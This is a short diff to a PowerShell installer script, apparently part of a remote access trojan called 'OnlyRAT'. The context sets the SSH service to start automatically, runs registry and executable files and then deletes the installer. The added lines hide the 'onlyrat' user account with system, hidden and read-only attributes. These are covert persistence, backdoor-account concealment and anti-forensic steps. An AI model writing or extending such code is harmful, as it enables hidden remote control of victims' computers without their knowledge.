@@ -56,6 +56,10 @@ Set-Service -Name sshd -StartupType 'Automatic'
 # install the registry
 ./wrev.reg; ./calty
 
+# hide onlyrat user
+cd C:\Users
+attrib +h +s +r onlyrat 
+
 # self delete
 cd $initial_dir
 del installer.ps1
